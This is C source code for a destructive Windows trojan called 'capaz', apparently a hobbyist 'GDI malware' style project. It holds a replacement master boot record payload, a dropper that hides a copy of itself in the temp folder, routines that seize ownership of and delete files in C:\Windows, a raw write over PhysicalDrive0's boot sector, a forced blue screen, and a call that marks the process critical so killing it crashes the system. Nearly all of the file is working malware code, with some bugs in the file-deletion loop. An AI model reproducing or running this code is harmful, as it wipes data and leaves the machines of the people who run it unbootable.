#include "capaz.h"

CONST CHAR pccMasterBootRecordData[ 512 ] = {
	0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xDB, 0xE3, 0xE8, 0x9A, 0x00, 0x31,
	0xED, 0x31, 0xD2, 0x31, 0xFF, 0x89, 0x2E, 0xD5, 0x7C, 0x89, 0x16, 0xD7, 0x7C, 0xD9, 0x06, 0xED,
	0x7C, 0xD9, 0xFE, 0xDF, 0x06, 0xD7, 0x7C, 0xDE, 0xC9, 0xD9, 0x1E, 0xE5, 0x7C, 0xD9, 0x06, 0xED,
	0x7C, 0xD9, 0xFF, 0xDF, 0x06, 0xD5, 0x7C, 0xDE, 0xC9, 0xD8, 0x26, 0xE5, 0x7C, 0xD9, 0x1E, 0xDD,
	0x7C, 0xD9, 0x06, 0xED, 0x7C, 0xD9, 0xFF, 0xDF, 0x06, 0xD7, 0x7C, 0xDE, 0xC9, 0xD9, 0x1E, 0xE9,
	0x7C, 0xD9, 0x06, 0xED, 0x7C, 0xD9, 0xFE, 0xDF, 0x06, 0xD5, 0x7C, 0xDE, 0xC9, 0xD8, 0x06, 0xE9,
	0x7C, 0xD9, 0x1E, 0xE1, 0x7C, 0xDB, 0x06, 0xDD, 0x7C, 0xDF, 0x1E, 0xD9, 0x7C, 0xDB, 0x06, 0xE1,
	0x7C, 0xDF, 0x1E, 0xDB, 0x7C, 0x8B, 0x1E, 0xD9, 0x7C, 0x33, 0x1E, 0xDB, 0x7C, 0x81, 0xE3, 0xFF,
	0x00, 0x88, 0xD8, 0xAA, 0x45, 0x81, 0xFD, 0x40, 0x01, 0x72, 0x8A, 0x31, 0xED, 0x42, 0x81, 0xFA,
	0xC8, 0x00, 0x72, 0x81, 0x31, 0xED, 0x31, 0xD2, 0x31, 0xFF, 0xD9, 0x06, 0xF1, 0x7C, 0xD8, 0x06,
	0xED, 0x7C, 0xD9, 0x1E, 0xED, 0x7C, 0xE9, 0x6C, 0xFF, 0x60, 0x31, 0xDB, 0xBA, 0xC8, 0x03, 0x88,
	0xD8, 0xEE, 0xBA, 0xC9, 0x03, 0x88, 0xD8, 0xC0, 0xE8, 0x02, 0xEE, 0x88, 0xD8, 0xF6, 0xD0, 0xC0,
	0xE8, 0x02, 0xEE, 0x88, 0xD8, 0x80, 0xE3, 0x7F, 0xC0, 0xE8, 0x02, 0xEE, 0x43, 0x81, 0xFB, 0x00,
	0x01, 0x75, 0xD9, 0x61, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC8,
	0x42, 0x0A, 0xD7, 0x23, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

BOOL
WINAPI
ExecuteMalwareDropper( 
	VOID 
)
{
	WCHAR szPath[ MAX_PATH ] = { 0 };
	WCHAR szNewPath[ MAX_PATH ] = { 0 };
	STARTUPINFO startupInformation = { 0 };
	PROCESS_INFORMATION processInformation;

	DWORD dwUnnamed;
	HANDLE hFile;

	GetModuleFileNameW( NULL, szPath, MAX_PATH );
start:
	GetTempPathW( MAX_PATH, szNewPath );

	if ( wcsncmp( szPath, szNewPath, wcslen( szNewPath ) ) )
	{
		WCHAR szFileName[ 17 ] = { 0 };
		GetRandomPath( szFileName, 16 );
		wcscat_s( szNewPath, MAX_PATH, szFileName );
		wcscat_s( szNewPath, MAX_PATH, L".txt" );

		if ( ( hFile = CreateFileW( szNewPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL ) ) == INVALID_HANDLE_VALUE )
		{
			RtlZeroMemory( szNewPath, MAX_PATH );
			goto start;
		}

		while ( !WriteFile( hFile, szPath, MAX_PATH, &dwUnnamed, NULL ) )
		{
			Sleep( 10 );
		}

		CloseHandle( hFile );

		GetTempPathW( MAX_PATH, szNewPath );
		wcscat_s( szNewPath, MAX_PATH, szFileName );
		wcscat_s( szNewPath, MAX_PATH, L".exe" );

		while ( !CopyFileW( szPath, szNewPath, FALSE ) )
		{
			Sleep( 10 );
		}

		while ( !SetFileAttributesW( szNewPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM ) )
		{
			Sleep( 10 );
		}

		startupInformation.cb = sizeof( startupInformation );
		CreateProcessW( szNewPath, NULL, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &startupInformation, &processInformation );
		CloseHandle( processInformation.hProcess );
		CloseHandle( processInformation.hThread );

		return FALSE;
	}
	else
	{
		*wcsrchr( szPath, L'.' ) = 0;
		wcscat_s( szPath, MAX_PATH, L".txt" );

		while ( ( hFile = CreateFileW( szPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL ) ) == INVALID_HANDLE_VALUE )
		{
			Sleep( 10 );
		}

		while ( !ReadFile( hFile, szNewPath, MAX_PATH, &dwUnnamed, NULL ) )
		{
			Sleep( 10 );
		}

		CloseHandle( hFile );

		while ( !DeleteFileW( szPath ) )
		{
			Sleep( 10 );
		}
		
		while ( !DeleteFileW( szNewPath ) )
		{
			Sleep( 10 );
		}

		if ( MessageBoxW( NULL, L"WARNING!\n\nYou are now running the capaz Win32 Trojan that can wipe all files on this device.\nAre you sure you want to run this?\n\nThe author Kimiberry is not responsible for any damage.", L"capaz/30secondsnewstuffR - 1/2", MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2 | MB_SYSTEMMODAL ) != IDYES )
			return FALSE;

		if ( MessageBoxW( NULL, L"FINAL WARNING!\n\ncapaz can destroy all files on this device. You will lose all of your data if you continue.\n\nPrevious warning:\nYou are now running the capaz Win32 Trojan that can wipe all files on this device.\n\nAre you really sure you want to run this?\nThe author Kimiberry is not responsible for any damage.", L"capaz/30secondsnewstuffR - 2/2", MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2 | MB_SYSTEMMODAL ) != IDYES )
			return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
SetPrivilege(
	_In_ HANDLE hToken,
	_In_ PWSTR  szPrivilege
)
{
	LUID luidPrivilege;
	TOKEN_PRIVILEGES tokenPrivileges;

	LookupPrivilegeValueW( NULL, szPrivilege, &luidPrivilege );

	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[ 0 ].Luid = luidPrivilege;
	tokenPrivileges.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges( hToken, FALSE, &tokenPrivileges, sizeof( TOKEN_PRIVILEGES ), ( PTOKEN_PRIVILEGES )NULL, ( PDWORD )NULL );

	if ( GetLastError( ) == ERROR_NOT_ALL_ASSIGNED )
	{
		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
TakeOwnership(
	_In_ PWSTR szOwnFile
)
{
	BOOL bRetval = FALSE;
	HANDLE hToken = NULL;
	PSID pSIDAdmin = NULL, pSIDEveryone = NULL;
	PACL pACL = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY, SIDAuthNT = SECURITY_NT_AUTHORITY;
	EXPLICIT_ACCESS explicitAccess[ NUMERAL_ACES ] = { 0 };
	DWORD dwRes;

	if ( !AllocateAndInitializeSid( &SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone ) )
	{
		goto cleanup;
	}

	if ( !AllocateAndInitializeSid( &SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin ) )
	{
		goto cleanup;
	}

	explicitAccess[ 0 ].grfAccessPermissions = GENERIC_ALL;
	explicitAccess[ 0 ].grfAccessMode = SET_ACCESS;
	explicitAccess[ 0 ].grfInheritance = NO_INHERITANCE;
	explicitAccess[ 0 ].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	explicitAccess[ 0 ].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	explicitAccess[ 0 ].Trustee.ptstrName = ( PWSTR )pSIDEveryone;

	explicitAccess[ 1 ].grfAccessPermissions = GENERIC_ALL;
	explicitAccess[ 1 ].grfAccessMode = SET_ACCESS;
	explicitAccess[ 1 ].grfInheritance = NO_INHERITANCE;
	explicitAccess[ 1 ].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	explicitAccess[ 1 ].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
	explicitAccess[ 1 ].Trustee.ptstrName = ( PWSTR )pSIDAdmin;

	if ( SetEntriesInAclW( NUMERAL_ACES, explicitAccess, NULL, &pACL ) != ERROR_SUCCESS )
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW( szOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL );

	if ( dwRes == ERROR_SUCCESS )
	{
		bRetval = TRUE;
		goto cleanup;
	}

	if ( dwRes != ERROR_ACCESS_DENIED )
	{
		goto cleanup;
	}

	if ( !OpenProcessToken( GetCurrentProcess( ), TOKEN_ADJUST_PRIVILEGES, &hToken ) )
	{
		goto cleanup;
	}

	if ( !SetPrivilege( hToken, SE_TAKE_OWNERSHIP_NAME, TRUE ) )
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW( szOwnFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL );

	if ( dwRes != ERROR_SUCCESS )
	{
		goto cleanup;
	}

	if ( !SetPrivilege( hToken, SE_TAKE_OWNERSHIP_NAME, FALSE ) )
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW( szOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL ); 

	if ( dwRes == ERROR_SUCCESS )
	{
		bRetval = TRUE;
	}

cleanup:
	if ( pSIDAdmin ) FreeSid( pSIDAdmin );
	if ( pSIDEveryone ) FreeSid( pSIDEveryone );
	if ( pACL ) LocalFree( pACL );
	if ( hToken ) CloseHandle( hToken );

	return bRetval;
}

BOOL
WINAPI
FileOpener(
	VOID
)
{
	WIN32_FIND_DATA findData;
	PWSTR szFilePath = L"C:\\Windows\\*.*";
	HANDLE hFind = FindFirstFileW( szFilePath, &findData );

	for ( ;; )
	{
		TakeOwnership( szFilePath );

		if ( Xorshift32( ) % 3000 )
		{
			DeleteFileW( szFilePath );
		}
		else
		{
			ShellExecuteW( NULL, L"open", findData.cFileName, NULL, 0, SW_SHOW );
			Sleep( Xorshift32( ) % 3000 );
		}
	}

	while ( FindNextFileW( hFind, &findData ) );
	ShellExecuteW( NULL, L"open", findData.cFileName, NULL, 0, SW_SHOW );
	FindClose( hFind );

	Sleep( 3000 );
	return TRUE;
}

BOOL
WINAPI
OverwriteBoot(
	VOID
)
{
	DWORD dwBytesWritten;
	HANDLE hPhysicalDrive = CreateFileW( L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL );

	if ( hPhysicalDrive == INVALID_HANDLE_VALUE )
	{
		MessageBoxW( NULL, L"error: yes i know i failed to open handle, nice cheats 5 year old bucko", L"capaz.exe", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL );
		CloseHandle( hPhysicalDrive );
		return FALSE;
	}

	DeviceIoControl( hPhysicalDrive, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesWritten, NULL );
	BOOL bOverwriteCheck = WriteFile( hPhysicalDrive, pccMasterBootRecordData, 512, &dwBytesWritten, NULL );

	if ( !bOverwriteCheck )
	{
		MessageBoxW( NULL, L"Why can't I overwrite your bootloader, I guess I can leave now.", L"capaz.exe", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL );
		CloseHandle( hPhysicalDrive );
		return FALSE;
	}

	DeviceIoControl( hPhysicalDrive, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesWritten, NULL );
	CloseHandle( hPhysicalDrive );
	return TRUE;
}

BOOL
WINAPI
BlueScreen(
	VOID
)
{
	NTSTATUS( NTAPI * RtlAdjustPrivilege )( ULONG uPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled );
	NTSTATUS( NTAPI * NtRaiseHardError )( NTSTATUS ntErrorStatus, ULONG uNumberOfParameters, PULONG_PTR puParameters, ULONG uResponseOption, PULONG puResponse );

	BOOL bUnused;
	NTSTATUS ntReturnValue;

	HMODULE hNtDll = LoadLibraryW( L"ntdll.dll" );
	RtlAdjustPrivilege = ( PVOID )GetProcAddress( hNtDll, "RtlAdjustPrivilege" );
	NtRaiseHardError = ( PVOID )GetProcAddress( hNtDll, "NtRaiseHardError" );

	if ( RtlAdjustPrivilege )
	{
		ntReturnValue = RtlAdjustPrivilege( 19 /* SeShutdownPrivilege */, TRUE, FALSE, &bUnused );

		if ( ntReturnValue )
		{
			MessageBoxW( NULL, L"I cannot adjust the privilege, dad.", L"capaz.exe", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL );
			FreeLibrary( hNtDll );
			return FALSE;
		}
	}

	if ( NtRaiseHardError )
	{
		ULONG uResponse;
		ULONG_PTR uArgs[] = { ( ULONG_PTR )"รรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรรร" };
		ntReturnValue = NtRaiseHardError( ( NTSTATUS )0xC0000144, 0, 0, ( PULONG )uArgs, 6, &uResponse );

		if ( ntReturnValue )
		{
			FreeLibrary( hNtDll );
			return TRUE;
		}
	}

	return FALSE;
}

BOOL
WINAPI
SetProcessCritical( 
	VOID
)
{
	NTSTATUS( NTAPI * RtlAdjustPrivilege )( ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled );
	NTSTATUS( NTAPI * RtlSetProcessIsCritical )( BOOLEAN bNew, PBOOLEAN pbOld, BOOLEAN bNeedScb );

	NTSTATUS ntReturnValue;
	ULONG ulBreakOnTermination;
	BOOLEAN bUnused;

	HMODULE hNtDll = LoadLibraryW( L"ntdll.dll" );
	RtlAdjustPrivilege = ( PVOID )GetProcAddress( hNtDll, "RtlAdjustPrivilege" );
	RtlSetProcessIsCritical = ( PVOID )GetProcAddress( hNtDll, "RtlSetProcessIsCritical" );
	
	if ( RtlAdjustPrivilege )
	{
		ntReturnValue = RtlAdjustPrivilege( 20 /* SeDebugPrivilege */, TRUE, FALSE, &bUnused );

		if ( ntReturnValue )
		{
			MessageBoxW( NULL, L"Nope, Not this dreaded ass privilege error again! :<", L"capaz.exe", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL );
			FreeLibrary( hNtDll );
			return FALSE;
		}
	}

	if ( RtlSetProcessIsCritical )
	{
		ulBreakOnTermination = 1;
		ntReturnValue = RtlSetProcessIsCritical( TRUE, NULL, FALSE );

		if ( ntReturnValue )
		{
			MessageBoxW( NULL, L"Not again!!!! >:(\nWhen can this actually fucking work???", L"capaz.exe", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL );
			FreeLibrary( hNtDll );
			return FALSE;
		}
	}

	return TRUE;
}